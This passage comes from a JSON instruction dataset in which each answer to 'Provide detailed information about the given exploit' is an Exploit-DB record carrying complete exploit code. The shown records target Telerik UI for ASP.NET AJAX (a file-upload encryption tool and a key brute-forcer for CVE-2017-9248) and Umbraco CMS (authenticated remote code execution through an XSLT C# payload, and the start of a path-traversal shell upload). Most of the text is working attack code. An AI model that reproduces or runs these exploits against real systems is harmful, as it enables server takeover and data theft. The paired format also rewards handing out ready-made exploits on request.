\"\\nTempTargetFolder = \" + \\\n                        RAUCipher.decrypt(TempTargetFolder) + \"\\n\"\n    rauVersion = RAUCipher.decrypt(rauPostData[1])\n    decoded = decoded + \"\\nVersion: \" + rauVersion + \"\\n\"\n    return decoded\n\n\ndef mode_decrypt():\n    # decrypt ciphertext\n    ciphertext = sys.argv[2]\n    print(\"\\n\" + RAUCipher.decrypt(ciphertext) + \"\\n\")\n\n\ndef mode_Decrypt_rauPostData():\n    # decrypt rauPostData\n    rauPostData = sys.argv[2]\n    print(decode_rauPostData(rauPostData))\n\n\ndef mode_encrypt():\n    # encrypt plaintext\n    plaintext = sys.argv[2]\n    print(\"\\n\" + RAUCipher.encrypt(plaintext) + \"\\n\")\n\n\ndef mode_Encrypt_rauPostData():\n    # encrypt rauPostData based on TempTargetFolder and Version\n    quiet = False\n    TempTargetFolder = sys.argv[2]\n    Version = sys.argv[3]\n    print(\n        \"rauPostData: \" +\n        rauPostData_prep(quiet, TempTargetFolder, Version) +\n        \"\\n\"\n    )\n\n\ndef mode_encrypt_rauPostData_Quiet():\n    # as per -E but just output encrypted rauPostData,\n    # not the prepared JSON and version\n    quiet = True\n    TempTargetFolder = sys.argv[2]\n    Version = sys.argv[3]\n    print(rauPostData_prep(quiet, TempTargetFolder, Version))\n\n\ndef mode_version():\n    # extract Telerik web ui version details from url\n    url = sys.argv[2]\n    print(getVersion(url))\n\n\ndef mode_payload():\n    # generate a payload based on TempTargetFolder, Version and payload file\n    TempTargetFolder = sys.argv[2]\n    Version = sys.argv[3]\n    payload_filename = sys.argv[4]\n    print(payload(TempTargetFolder, Version, payload_filename))\n\n\ndef mode_Post():\n    # generate and upload a payload based on\n    # TempTargetFolder, Version, payload file and url\n    TempTargetFolder = sys.argv[2]\n    Version = sys.argv[3]\n    payload_filename = sys.argv[4]\n    url = sys.argv[5]\n    print(upload(TempTargetFolder, Version, payload_filename, url))\n\n\ndef mode_help():\n    print(\n        \"Usage:\\n\" +\n        \"\\n\" +\n        \"Decrypt a plaintext:      -d ciphertext\\n\" +\n        \"Decrypt rauPostData:      -D rauPostData\\n\" +\n        \"Encrypt a plaintext:      -e plaintext\\n\" +\n        \"Gen rauPostData:          -E TempTargetFolder Version\\n\" +\n        \"Gen rauPostData (quiet):  -Q TempTargetFolder Version\\n\" +\n        \"Version in HTTP response: -v url\\n\" +\n        \"Generate a POST payload:  -p TempTargetFolder Version c:\\\\\\\\folder\\\\\\\\filename\\n\" +\n        \"Upload a payload:         -P TempTargetFolder Version c:\\\\\\\\folder\\\\\\\\filename url\\n\\n\"\n        \"Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau\"\n    )\n\n\nsys.stderr.write(\"\\nRAU_crypto by Paul Taylor / Foregenix Ltd.\\n\")\nsys.stderr.write(\n        \"CVE-2017-11317 - \" +\n        \"Telerik RadAsyncUpload hardcoded keys / arbitrary file upload\\n\\n\"\n        )\n\nif len(sys.argv) < 2:\n    mode_help()\nelif sys.argv[1] == \"-d\" and len(sys.argv) == 3:\n    mode_decrypt()\nelif sys.argv[1] == \"-D\" and len(sys.argv) == 3:\n    mode_Decrypt_rauPostData()\nelif sys.argv[1] == \"-e\" and len(sys.argv) == 3:\n    mode_encrypt()\nelif sys.argv[1] == \"-E\" and len(sys.argv) == 4:\n    mode_Encrypt_rauPostData()\nelif sys.argv[1] == \"-Q\" and len(sys.argv) == 4:\n    mode_encrypt_rauPostData_Quiet()\nelif sys.argv[1] == \"-v\" and len(sys.argv) == 3:\n    mode_version()\nelif sys.argv[1] == \"-p\" and len(sys.argv) == 5:\n    mode_payload()\nelif sys.argv[1] == \"-P\" and len(sys.argv) == 6:\n    mode_Post()\nelse:\n    mode_help()"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 43873",
        "output": {
            "ID": "43873",
            "File": "exploits/aspx/webapps/43873.py",
            "Description": "Telerik UI for ASP.NET AJAX 2012.3.1308 < 2017.1.118 - Encryption Keys Disclosure",
            "Date Published": "2018-01-24",
            "Author": "Paul Taylor",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2018-01-24",
            "Date Updated": "2018-01-26",
            "Verified": "0",
            "Codes": [
                "CVE-2017-9248"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Telerik UI for ASP.NET AJAX DialogHandler Dialog cracker\n# Filename: dp_crypto.py\n# Github: https://github.com/bao7uo/dp_crypto\n# Date: 2018-01-23\n\n# Exploit Author: Paul Taylor / Foregenix Ltd\n# Website: http://www.foregenix.com/blog\n\n# Version: Telerik UI for ASP.NET AJAX\n# CVE: CVE-2017-9248\n# Vendor Advisory: https://www.telerik.com/support/kb/aspnet-ajax/details/cryptographic-weakness\n\n# Tested on: Working on versions 2012.3.1308 thru 2017.1.118 (.NET 35, 40, 45)\n\n#!/usr/bin/python3\n\n# Author: Paul Taylor / Foregenix Ltd\n\n# https://github.com/bao7uo/dp_crypto/blob/master/dp_crypto.py\n\n# dp_crypto - CVE-2017-9248 exploit\n# Telerik.Web.UI.dll Cryptographic compromise\n\n# Warning - no cert warnings,\n# and verify = False in code below prevents verification\n\nimport sys\nimport base64\nimport requests\nimport re\nimport binascii\n\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nrequests_sent = 0\nchar_requests = 0\n\n\ndef get_result(plaintext, key, session, pad_chars):\n    global requests_sent, char_requests\n\n    url = sys.argv[2]\n    base_pad = (len(key) % 4)\n    base = '' if base_pad == 0 else pad_chars[0:4 - base_pad]\n    dp_encrypted = base64.b64encode(\n                                (encrypt(plaintext, key) + base).encode()\n                            ).decode()\n    request = requests.Request('GET', url + '?dp=' + dp_encrypted)\n    request = request.prepare()\n    response = session.send(request, verify=False)\n    requests_sent += 1\n    char_requests += 1\n\n    match = re.search(\"(Error Message:)(.+\\n*.+)(</div>)\", response.text)\n    return True \\\n        if match is not None \\\n        and match.group(2) == \"Index was outside the bounds of the array.\" \\\n        else False\n\n\ndef test_keychar(keychar, found, session, pad_chars):\n    base64chars = [\n                    \"A\", \"Q\", \"g\", \"w\", \"B\", \"R\", \"h\", \"x\", \"C\", \"S\", \"i\", \"y\",\n                    \"D\", \"T\", \"j\", \"z\", \"E\", \"U\", \"k\", \"0\", \"F\", \"V\", \"l\", \"1\",\n                    \"G\", \"W\", \"m\", \"2\", \"H\", \"X\", \"n\", \"3\", \"I\", \"Y\", \"o\", \"4\",\n                    \"J\", \"Z\", \"p\", \"5\", \"K\", \"a\", \"q\", \"6\", \"L\", \"b\", \"r\", \"7\",\n                    \"M\", \"c\", \"s\", \"8\", \"N\", \"d\", \"t\", \"9\", \"O\", \"e\", \"u\", \"+\",\n                    \"P\", \"f\", \"v\", \"/\"\n                  ]\n\n    duff = False\n    accuracy_thoroughness_threshold = sys.argv[5]\n    for bc in range(int(accuracy_thoroughness_threshold)):\n                                                # ^^ max is len(base64chars)\n        sys.stdout.write(\"\\b\\b\" + base64chars[bc] + \"]\")\n        sys.stdout.flush()\n        if not get_result(\n                      base64chars[0] * len(found) + base64chars[bc],\n                      found + keychar, session, pad_chars\n                      ):\n            duff = True\n            break\n    return False if duff else True\n\n\ndef encrypt(dpdata, key):\n    encrypted = []\n    k = 0\n    for i in range(len(dpdata)):\n        encrypted.append(chr(ord(dpdata[i]) ^ ord(key[k])))\n        k = 0 if k >= len(key) - 1 else k + 1\n    return ''.join(str(e) for e in encrypted)\n\n\ndef mode_decrypt():\n    ciphertext = base64.b64decode(sys.argv[2].encode()).decode()\n    key = sys.argv[3]\n    print(base64.b64decode(encrypt(ciphertext, key)).decode())\n    print(\"\")\n\n\ndef mode_encrypt():\n    plaintext = sys.argv[2]\n    key = sys.argv[3]\n\n    plaintext = base64.b64encode(plaintext.encode()).decode()\n    print(base64.b64encode(encrypt(plaintext, key).encode()).decode())\n    print(\"\")\n\n\ndef test_keypos(key_charset, unprintable, found, session):\n    pad_chars = ''\n    for pad_char in range(256):\n        pad_chars += chr(pad_char)\n\n    for i in range(len(pad_chars)):\n        for k in range(len(key_charset)):\n            keychar = key_charset[k]\n            sys.stdout.write(\"\\b\"*6)\n            sys.stdout.write(\n                        (\n                            keychar\n                            if unprintable is False\n                            else '+'\n                        ) +\n                        \") [\" + (\n                            keychar\n                            if unprintable is False\n                            else '+'\n                        ) +\n                        \"]\"\n                    )\n            sys.stdout.flush()\n            if test_keychar(keychar, found, session, pad_chars[i] * 3):\n                return keychar\n    return False\n\n\ndef get_key(session):\n    global char_requests\n    found = ''\n    unprintable = False\n\n    key_length = sys.argv[3]\n    key_charset = sys.argv[4]\n    if key_charset == 'all':\n        unprintable = True\n        key_charset = ''\n        for i in range(256):\n            key_charset += chr(i)\n    else:\n        if key_charset == 'hex':\n            key_charset = '01234567890ABCDEF'\n\n    print(\"Attacking \" + sys.argv[2])\n    print(\n        \"to find key of length [\" +\n        str(key_length) +\n        \"] with accuracy threshold [\" +\n        sys.argv[5] +\n        \"]\"\n    )\n    print(\n        \"using key charset [\" +\n        (\n            key_charset\n            if unprintable is False\n            else '- all ASCII -'\n        ) +\n        \"]\\n\"\n    )\n    for i in range(int(key_length)):\n        pos_str = (\n            str(i + 1)\n            if i > 8\n            else \"0\" + str(i + 1)\n        )\n        sys.stdout.write(\"Key position \" + pos_str + \": (------\")\n        sys.stdout.flush()\n        keychar = test_keypos(key_charset, unprintable, found, session)\n        if keychar is not False:\n            found = found + keychar\n            sys.stdout.write(\n                          \"\\b\"*7 + \"{\" +\n                          (\n                              keychar\n                              if unprintable is False\n                              else '0x' + binascii.hexlify(keychar.encode()).decode()\n                          ) +\n                          \"} found with \" +\n                          str(char_requests) +\n                          \" requests, total so far: \" +\n                          str(requests_sent) +\n                          \"\\n\"\n                      )\n            sys.stdout.flush()\n            char_requests = 0\n        else:\n            sys.stdout.write(\"\\b\"*7 + \"Not found, quitting\\n\")\n            sys.stdout.flush()\n            break\n    if keychar is not False:\n        print(\"Found key: \" +\n              (\n                found\n                if unprintable is False\n                else \"(hex) \" + binascii.hexlify(found.encode()).decode()\n              )\n              )\n    print(\"Total web requests: \" + str(requests_sent))\n    return found\n\n\ndef mode_brutekey():\n    session = requests.Session()\n    found = get_key(session)\n\n    if found == '':\n        return\n    else:\n        urls = {}\n        url_path = sys.argv[2]\n        params = (\n                    '?DialogName=DocumentManager' +\n                    '&renderMode=2' +\n                    '&Skin=Default' +\n                    '&Title=Document%20Manager' +\n                    '&dpptn=' +\n                    '&isRtl=false' +\n                    '&dp='\n                  )\n        versions = [\n                    '2007.1423', '2007.1521', '2007.1626', '2007.2918',\n                    '2007.21010', '2007.21107', '2007.31218', '2007.31314',\n                    '2007.31425', '2008.1415', '2008.1515', '2008.1619',\n                    '2008.2723', '2008.2826', '2008.21001', '2008.31105',\n                    '2008.31125', '2008.31314', '2009.1311', '2009.1402',\n                    '2009.1527', '2009.2701', '2009.2826', '2009.31103',\n                    '2009.31208', '2009.31314', '2010.1309', '2010.1415',\n                    '2010.1519', '2010.2713', '2010.2826', '2010.2929',\n                    '2010.31109', '2010.31215', '2010.31317', '2011.1315',\n                    '2011.1413', '2011.1519', '2011.2712', '2011.2915',\n                    '2011.31115', '2011.3.1305', '2012.1.215', '2012.1.411',\n                    '2012.2.607', '2012.2.724', '2012.2.912', '2012.3.1016',\n                    '2012.3.1205', '2012.3.1308', '2013.1.220', '2013.1.403',\n                    '2013.1.417', '2013.2.611', '2013.2.717', '2013.3.1015',\n                    '2013.3.1114', '2013.3.1324', '2014.1.225', '2014.1.403',\n                    '2014.2.618', '2014.2.724', '2014.3.1024', '2015.1.204',\n                    '2015.1.225', '2015.1.401', '2015.2.604', '2015.2.623',\n                    '2015.2.729', '2015.2.826', '2015.3.930', '2015.3.1111',\n                    '2016.1.113', '2016.1.225', '2016.2.504', '2016.2.607',\n                    '2016.3.914', '2016.3.1018', '2016.3.1027', '2017.1.118',\n                    '2017.1.228', '2017.2.503', '2017.2.621', '2017.2.711',\n                    '2017.3.913'\n                    ]\n\n        plaintext1 = 'EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,'\n        plaintext2_raw1 = 'Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version='\n        plaintext2_raw3 = ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'\n        plaintext3 = ';AllowMultipleSelection,False,3,False'\n\n        for version in versions:\n            plaintext2_raw2 = version\n            plaintext2 = base64.b64encode(\n                            (plaintext2_raw1 +\n                                plaintext2_raw2 +\n                                plaintext2_raw3\n                             ).encode()\n                        ).decode()\n            plaintext = plaintext1 + plaintext2 + plaintext3\n            plaintext = base64.b64encode(\n                            plaintext.encode()\n                        ).decode()\n            ciphertext = base64.b64encode(\n                            encrypt(\n                                plaintext,\n                                found\n                            ).encode()\n                        ).decode()\n            full_url = url_path + params + ciphertext\n            urls[version] = full_url\n\n        found_valid_version = False\n        for version in urls:\n            url = urls[version]\n            request = requests.Request('GET', url)\n            request = request.prepare()\n            response = session.send(request, verify=False)\n            if response.status_code == 500:\n                continue\n            else:\n                match = re.search(\n                    \"(Error Message:)(.+\\n*.+)(</div>)\",\n                    response.text\n                    )\n                if match is None:\n                    print(version + \": \" + url)\n                    found_valid_version = True\n                    break\n\n        if not found_valid_version:\n            print(\"No valid version found\")\n\ndef mode_samples():\n    print(\"Samples for testing decryption and encryption functions:\")\n    print(\"-d ciphertext key\")\n    print(\"-e plaintext key\")\n    print(\"\")\n    print(\"Key:\")\n    print(\"DC50EEF37087D124578FD4E205EFACBE0D9C56607ADF522D\")\n    print(\"\")\n    print(\"Plaintext:\")\n    print(\"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,VGVsZXJpay5XZWIuVUkuRWRpdG9yLkRpYWxvZ0NvbnRyb2xzLkRvY3VtZW50TWFuYWdlckRpYWxvZywgVGVsZXJpay5XZWIuVUksIFZlcnNpb249MjAxNi4yLjUwNC40MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0xMjFmYWU3ODE2NWJhM2Q0;AllowMultipleSelection,False,3,False\")\n    print(\"\")\n    print(\"Ciphertext:\")\n    print(\"FhQAWBwoPl9maHYCJlx8YlZwQDAdYxRBYlgDNSJxFzZ9PUEWVlhgXHhxFipXdWR0HhV3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMLciMVMnN9AFJ0Z2EDWG4sPCpnZQMtHhRnWx8SFHBuaHZbEQJgAVdwbjwlcxNeVHY9ARgUOj9qF045eXBkSVMWEXFgX2QxHgRjSRESf1htY0BwHWZKTm9kTz8IcAwFZm0HNSNxBC5lA39zVH57Q2EJDndvYUUzCAVFRBw/KmJiZwAOCwB8WGxvciwlcgdaVH0XKiIudz98Ams6UWFjQ3oCPBJ4X0EzHXJwCRURMnVVXX5eJnZkcldgcioecxdeanMLNCAUdz98AWMrV354XHsFCTVjenh1HhdBfhwdLmVUd0BBHWZgc1RgQCoRBikEamY9ARgUOj9qF047eXJ/R3kFIzF4dkYJJnF7WCcCKgVuaGpHJgMHZWxvaikIcR9aUn0LKg0HAzZ/dGMzV3Fgc1QsfXVWAGQ9FXEMRSECEEZTdnpOJgJoRG9wbj8SfClFamBwLiMUFzZiKX8wVgRjQ3oCM3FjX14oIHJ3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMDMBEXNg9TdXcxVGEDZVVyEixUcUoDHRRNSh8WMUl7dWJfJnl8WHoHbnIgcxNLUlgDNRMELi1SAwAtVgd0WFMGIzVnX3Q3J3FgQwgGMQRjd35CHgJkXG8FbTUWWQNBUwcQNQwAOiRmPmtzY1psfmcVMBNvZUooJy5ZQgkuFENuZ0BBHgFgWG9aVDMlbBdCUgdxMxMELi1SAwAtY35aR20UcS5XZWc3Fi5zQyZ3E0B6c0BgFgBoTmJbUA0ncwMHfmMtJxdzLnRmKG8xUWB8aGIvBi1nSF5xEARBYyYDKmtSeGJWCXQHBmxaDRUhYwxLVX01CyByCHdnEHcUUXBGaHkVBhNjAmh1ExVRWycCCEFiXnptEgJaBmJZVHUeBR96ZlsLJxYGMjJpHFJyYnBGaGQZEhFjZUY+FxZvUScCCEZjXnpeCVtjAWFgSAQhcXBCfn0pCyAvFHZkL3RzeHMHdFNzIBR4A2g+HgZdZyATNmZ6aG5WE3drQ2wFCQEnBD12YVkDLRdzMj9pEl0MYXBGaVUHEi94XGA3HS5aRyAAd0JlXQltEgBnTmEHagAJX3BqY1gtCAwvBzJ/dH8wV3EPA2MZEjVRdV4zJgRjZB8SPl9uA2pHJgMGR2dafjUnBhBBfUw9ARgUOj9qFQR+\")\n    print(\"\")\n\n\ndef mode_b64e():\n    print(base64.b64encode(sys.argv[2].encode()).decode())\n    print(\"\")\n\n\ndef mode_b64d():\n    print(base64.b64decode(sys.argv[2].encode()).decode())\n    print(\"\")\n\n\ndef mode_help():\n    print(\"Usage:\")\n    print(\"\")\n    print(\"Decrypt a ciphertext:        -d ciphertext key\")\n    print(\"Encrypt a plaintext:         -e plaintext key\")\n    print(\"Bruteforce key/generate URL: -k url key_length key_charset accuracy\")\n    print(\"Encode parameter to base64:  -b plain_parameter\")\n    print(\"Decode base64 parameter:     -p encoded_parameter\")\n    print(\"\")\n    print(\"To test all ascii characters set key_charset to: all, \" +\n          \"for upper case hex (e.g. machine key) set to hex.\")\n    print(\"\")\n    print(\"Maximum accuracy is out of 64 where 64 is the most accurate, \" +\n          \"accuracy of 9 will usually suffice for a hex, but 21 or more \" +\n          \"might be needed when testing all ascii characters.\")\n    print(\"Increase the accuracy argument if no valid version is found.\")\n    print(\"\")\n    print(\"Examples to generate a valid file manager URL:\")\n    print(\"./dp_crypto.py -k http://a/Telerik.Web.UI.DialogHandler.aspx 48 hex 9\")\n    print(\"./dp_crypto.py -k http://a/Telerik.Web.UI.DialogHandler.aspx 48 all 21\")\n    print(\"\")\n\n\nsys.stderr.write(\n              \"\\ndp_crypto by Paul Taylor / Foregenix Ltd\\nCVE-2017-9248 - \" +\n              \"Telerik.Web.UI.dll Cryptographic compromise\\n\\n\"\n            )\n\nif len(sys.argv) < 2:\n    mode_help()\n\nelif sys.argv[1] == \"-d\" and len(sys.argv) == 4:\n    mode_decrypt()\nelif sys.argv[1] == \"-e\" and len(sys.argv) == 4:\n    mode_encrypt()\nelif sys.argv[1] == \"-k\" and len(sys.argv) == 6:\n    mode_brutekey()\nelif sys.argv[1] == \"-s\" and len(sys.argv) == 2:\n    mode_samples()\nelif sys.argv[1] == \"-b\" and len(sys.argv) == 3:\n    mode_b64e()\nelif sys.argv[1] == \"-p\" and len(sys.argv) == 3:\n    mode_b64d()\nelse:\n    mode_help()"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 46153",
        "output": {
            "ID": "46153",
            "File": "exploits/aspx/webapps/46153.py",
            "Description": "Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution",
            "Date Published": "2019-01-14",
            "Author": "Gregory Draperi",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-01-14",
            "Date Updated": "2019-03-17",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comUmbracoCms.7.12.4.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators\n# Dork: N/A\n# Date: 2019-01-13\n# Exploit Author: Gregory DRAPERI & Hugo BOUTINON\n# Vendor Homepage: http://www.umbraco.com/\n# Software Link: https://our.umbraco.com/download/releases\n# Version: 7.12.4\n# Category: Webapps\n# Tested on: Windows IIS\n# CVE: N/A\n\n\nimport requests;\n\nfrom bs4 import BeautifulSoup;\n\ndef print_dict(dico):\n    print(dico.items());\n\nprint(\"Start\");\n\n# Execute a calc for the PoC\npayload = '<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" \\\nxmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" \\\nxmlns:csharp_user=\"http://csharp.mycompany.com/mynamespace\">\\\n<msxsl:script language=\"C#\" implements-prefix=\"csharp_user\">public string xml() \\\n{ string cmd = \"\"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\\n proc.StartInfo.FileName = \"calc.exe\"; proc.StartInfo.Arguments = cmd;\\\n proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\\n proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\\n </msxsl:script><xsl:template match=\"/\"> <xsl:value-of select=\"csharp_user:xml()\"/>\\\n </xsl:template> </xsl:stylesheet> ';\n\nlogin = \"XXXX;\npassword=\"XXXX\";\nhost = \"XXXX\";\n\n# Step 1 - Get Main page\ns = requests.session()\nurl_main =host+\"/umbraco/\";\nr1 = s.get(url_main);\nprint_dict(r1.cookies);\n\n# Step 2 - Process Login\nurl_login = host+\"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin\";\nloginfo = {\"username\":login,\"password\":password};\nr2 = s.post(url_login,json=loginfo);\n\n# Step 3 - Go to vulnerable web page\nurl_xslt = host+\"/umbraco/developer/Xslt/xsltVisualize.aspx\";\nr3 = s.get(url_xslt);\n\nsoup = BeautifulSoup(r3.text, 'html.parser');\nVIEWSTATE = soup.find(id=\"__VIEWSTATE\")['value'];\nVIEWSTATEGENERATOR = soup.find(id=\"__VIEWSTATEGENERATOR\")['value'];\nUMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];\nheaders = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};\ndata = {\"__EVENTTARGET\":\"\",\"__EVENTARGUMENT\":\"\",\"__VIEWSTATE\":VIEWSTATE,\"__VIEWSTATEGENERATOR\":VIEWSTATEGENERATOR,\"ctl00$body$xsltSelection\":payload,\"ctl00$body$contentPicker$ContentIdValue\":\"\",\"ctl00$body$visualizeDo\":\"Visualize+XSLT\"};\n\n# Step 4 - Launch the attack\nr4 = s.post(url_xslt,data=data,headers=headers);\n\nprint(\"End\");"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 49488",
        "output": {
            "ID": "49488",
            "File": "exploits/aspx/webapps/49488.py",
            "Description": "Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)",
            "Date Published": "2021-01-28",
            "Author": "Alexandre ZANNI",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2021-01-28",
            "Date Updated": "2021-01-28",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)\n# Date: 2020-03-28\n# Exploit Author: Alexandre ZANNI (noraj)\n# Based on: https://www.exploit-db.com/exploits/46153\n# Vendor Homepage: http://www.umbraco.com/\n# Software Link: https://our.umbraco.com/download/releases\n# Version: 7.12.4\n# Category: Webapps\n# Tested on: Windows IIS\n# Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig\n\nimport requests\nimport re\nimport argparse\n\nfrom bs4 import BeautifulSoup\n\nparser = argparse.ArgumentParser(prog='exploit.py',\n    description='Umbraco authenticated RCE',\n    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))\nparser.add_argument('-u', '--user', metavar='USER', type=str,\n    required=True, dest='user', help='username / email')\nparser.add_argument('-p', '--password', metavar='PASS', type=str,\n    required=True, dest='password', help='password')\nparser.add_argument('-i', '--host', metavar='URL', type=str, required=True,\n    dest='url', help='root URL')\nparser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,\n    dest='command', help='command')\nparser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,\n    dest='arguments', help='arguments', default='')\nargs = parser.parse_args()\n\n# Payload\npayload = \"\"\"\\\n<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:csharp_user=\"http://csharp.mycompany.com/mynamespace\"><msxsl:script language=\"C#\" implements-prefix=\"csharp_user\">public string xml() { string cmd = \"%s\"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \"%s\"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match=\"/\"> <xsl:value-of select=\"csharp_user:xml()\"/> </xsl:template> </xsl:stylesheet>\\\n\"\"\" % (args.arguments, args.command)\n\nlogin = args.user\npassword = args.password\nhost = args.url\n\n# Process Login\nurl_login = host + \"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin\"\nloginfo = { \"username\": login, \"password\": password}\ns = requests.session()\nr2 = s.post(url_login,json=loginfo)\n\n# Go to vulnerable web page\nurl_xslt = host + \"/umbraco/developer/Xslt/xsltVisualize.aspx\"\nr3 = s.get(url_xslt)\n\nsoup = BeautifulSoup(r3.text, 'html.parser')\nVIEWSTATE = soup.find(id=\"__VIEWSTATE\")['value']\nVIEWSTATEGENERATOR = soup.find(id=\"__VIEWSTATEGENERATOR\")['value']\nUMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']\nheaders = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}\ndata = { \"__EVENTTARGET\": \"\", \"__EVENTARGUMENT\": \"\", \"__VIEWSTATE\": VIEWSTATE,\n    \"__VIEWSTATEGENERATOR\": VIEWSTATEGENERATOR,\n    \"ctl00$body$xsltSelection\": payload,\n    \"ctl00$body$contentPicker$ContentIdValue\": \"\",\n    \"ctl00$body$visualizeDo\": \"Visualize+XSLT\" }\n\n# Launch the attack\nr4 = s.post(url_xslt, data=data, headers=headers)\n# Filter output\nsoup = BeautifulSoup(r4.text, 'html.parser')\nCMDOUTPUT = soup.find(id=\"result\").getText()\nprint(CMDOUTPUT)"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 50241",
        "output": {
            "ID": "50241",
            "File": "exploits/aspx/webapps/50241.py",
            "Description": "Umbraco CMS 8.9.1 - Directory Traversal",
            "Date Published": "2021-08-31",
            "Author": "BitTheByte",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2021-08-31",
            "Date Updated": "2021-10-29",
            "Verified": "0",
            "Codes": [
                "CVE-2020-5811"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Umbraco CMS 8.9.1 - Path traversal and Arbitrary File Write (Authenticated)\n# Exploit Author: BitTheByte\n# Description: Authenticated path traversal vulnerability.\n# Exploit Research: https://www.tenable.com/security/research/tra-2020-59\n# Vendor Homepage: https://umbraco.com/\n# Version: <= 8.9.1\n# CVE : CVE-2020-5811\n\nimport string\nimport random\nimport argparse\nimport zipfile\nimport os\n\npackage_xml = f\"\"\"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<umbPackage>\n  <files>\n    <file>\n      <guid>{{filename}}</guid>\n      <orgPath>{{upload_path}}</orgPath>\n      <orgName>{{filename}}</orgName>\n    </file>\n  </files>\n  <info>\n    <package>\n      <name>PoC-{''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))}</name>\n      <version>1.0.0</version>\n      <iconUrl></iconUrl>\n      <license url=\"http://opensource.org/licenses/MIT\">MIT License</license>\n      <url>https://example.com</url>\n      <requirements>\n        <major>0</major>\n        <minor>0</minor>\n        <patch>0</patch>\n      </requirements>\n    </package>\n    <author>\n      <name>CVE-2020-5811</name>\n      <website>https://example.com</website>\n    </author>\n    <contributors>\n      <contributor></contributor>\n    </contributors>\n    <readme><![CDATA[]]></readme>\n  </info>\n  <DocumentTypes />\n  <Templates />\n  <Stylesheets />\n  <Macros />\n  <DictionaryItems />\n  <Languages />\n  <DataTypes />\n  <Actions />\n</umbPackage>\n\"\"\"\n\nparser = argparse.ArgumentParser(description='CVE-2020-5811')\nparser.add_argument('--shell', type=str, help='Shell file to upload', required=True)\nparser.add_argument('--upload-path', type=str, help='Shell file update path on target server (default=~/../scripts)', default='~/../scripts')\nargs = parser.parse_args()\n\nif not os.path.isfile(args.shell):\n  print(\"[ERROR] please use a 